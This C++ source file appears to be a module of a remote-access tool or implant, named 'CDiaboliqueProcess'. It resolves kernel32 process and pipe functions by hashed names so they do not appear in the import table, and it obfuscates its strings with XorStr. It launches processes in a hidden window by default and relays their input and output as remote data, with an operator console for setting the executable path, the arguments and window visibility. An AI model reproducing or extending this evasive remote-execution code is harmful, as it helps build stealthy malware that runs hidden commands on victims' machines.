#include "CDiabolqiueProcess.h"
#include <BaseIncludes.h>
#include "ProcessController.h"
#include <processthreadsapi.h>
#include <WindowsImportHide/WindowsImportHide.h>
#include <PETools.h>


void InitializeProcessController()
{
	if (!ProcessController::IsInitialized())
	{
#define GEN_HASH(Func) constexpr auto Func##_Hash = PETools::PeToolsDefaultHasherConstExpr<const char*>(#Func);
#define GetKernel32Func(Func) PETools::_GetExportAddress(hKern32, NULL, Func##_Hash, &PETools::PeToolsDefaultHasher)



#if 0
		WINDOWS_IMPORT_HIDE(CreateProcessA, "Kernel32.dll");
		WINDOWS_IMPORT_HIDE(CreatePipe, "Kernel32.dll");
		WINDOWS_IMPORT_HIDE(SetHandleInformation, "Kernel32.dll");
		WINDOWS_IMPORT_HIDE(CloseHandle, "Kernel32.dll");
		WINDOWS_IMPORT_HIDE(WriteFile, "Kernel32.dll");
		WINDOWS_IMPORT_HIDE(ReadFile, "Kernel32.dll");
		WINDOWS_IMPORT_HIDE(PeekNamedPipe, "Kernel32.dll");
		WINDOWS_IMPORT_HIDE(SetStdHandle, "Kernel32.dll");

		ProcessController::INIT_ProcessController(_CreateProcessA.get(),
			_CreatePipe.get(), _SetHandleInformation.get(), _CloseHandle.get(),
			_WriteFile.get(), _ReadFile.get(), _SetStdHandle.get(), _PeekNamedPipe.get()
		); 
#endif
		GEN_HASH(CreateProcessA);
		GEN_HASH(CreatePipe);
		GEN_HASH(SetHandleInformation);
		GEN_HASH(CloseHandle);
		GEN_HASH(WriteFile);
		GEN_HASH(ReadFile);
		GEN_HASH(SetStdHandle);
		GEN_HASH(PeekNamedPipe);

		constexpr auto kern32_Hash = PETools::PeToolsDefaultHasherConstExpr<const char*>("kernel32.dll");
		HMODULE hKern32 = PETools::GetModuleHash(kern32_Hash, &PETools::PeToolsDefaultHasher);


		ProcessController::INIT_ProcessController(
			GetKernel32Func(CreateProcessA),
			GetKernel32Func(CreatePipe),
			GetKernel32Func(SetHandleInformation),
			GetKernel32Func(CloseHandle),
			GetKernel32Func(WriteFile),
			GetKernel32Func(ReadFile),
			GetKernel32Func(SetStdHandle),
			GetKernel32Func(PeekNamedPipe)
		);





	}
}

CDiaboliqueProcess::CDiaboliqueProcess()
{
	InitializeProcessController();
	m_bAlive = true;
};

bool CDiaboliqueProcess::Initialize(void* pPath, size_t nDataSize)
{
	if (nDataSize < sizeof(cdiaboliqueprocess_startup_message_t))
		return false;

	cdiaboliqueprocess_startup_message_t* pStartup = reinterpret_cast<cdiaboliqueprocess_startup_message_t*>(pPath);

	__try {
		if (!m_Process.StartProcess(pStartup->m_Path, pStartup->m_CmdLine, pStartup->m_bHiddenWindow))
			return false;

		m_bAlive = true;
		m_bInitialized = true;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		m_bAlive = false;
		m_bInitialized = false;
	}

	return true;
}

bool CDiaboliqueProcess::ShutDown()
{
	return m_Process.CloseProcess();
}

bool CDiaboliqueProcess::FreeLibrary()
{
	return true;
}

bool CDiaboliqueProcess::SendData(void* pData, size_t nDataSize, size_t& nDataSent)
{
	bool bRet = m_Process.SendDataToProcess(pData, nDataSize);

	if (bRet)
		nDataSent = nDataSize;
	else
		m_bAlive = false;
	return bRet;
}

bool CDiaboliqueProcess::RecvData(void* pBuffer, size_t nBufferSize, size_t& nDataRecieved)
{
	bool bRet = m_Process.RecvDataFromProcess(pBuffer, nBufferSize, &nDataRecieved);

#ifdef _DEBUG
	if (nDataRecieved)
	{
		char* pData = (char*)pBuffer;
		int l = 0;
	}
#endif

	if(!bRet)
		m_bAlive = false;

	return bRet;
}


#if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)
#include <iostream>
bool __stdcall GenerateInitializationForProcess(std::string input, void** ppMemory, size_t& nDataSize)
{
	CDiaboliqueProcess::cdiaboliqueprocess_startup_message_t startup;
	memset(&startup, 0, sizeof(startup));
	printf(XorStr("			=== PROCESS CONTROLLER INITIALIZATION ===          \n"));
	printf(XorStr("Please Input Path To Executable:\n> "));
	input = std::string();
	std::getline(std::cin, input);
	strcpy(startup.m_Path, input.c_str());

	printf(XorStr("Please Input Command Line Arguements:\n> "));
	input = std::string();
	std::getline(std::cin, input);
	strcpy(startup.m_CmdLine, input.c_str());

	startup.m_bHiddenWindow = true;
	printf(XorStr("Please 1 For Hidden Window, 0 For Shown Window:\n> "));
	input = std::string();
	std::getline(std::cin, input);
	if(input.size())
		startup.m_bHiddenWindow = atoi(input.c_str());

	printf(XorStr(
		"PROCESS CONTROLLER STARTUP INFO : \n"
		"\t\tm_Path : %s\n"
		"\t\tm_CmdLine : %s\n"
		"\t\tm_bHiddenWindow : %d\n"),
		startup.m_Path, startup.m_CmdLine, startup.m_bHiddenWindow
	);

	printf(XorStr("\n\n\n			=== END PROCESS CONTROLLER INITIALIZATION ===          \n\n\n"));
	*ppMemory = malloc(sizeof(startup));

	if (!*ppMemory)
		return false;

	memcpy_s(*ppMemory, sizeof(startup), &startup, sizeof(startup));
	nDataSize = sizeof(startup);

	return true;
}

#endif // #if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)
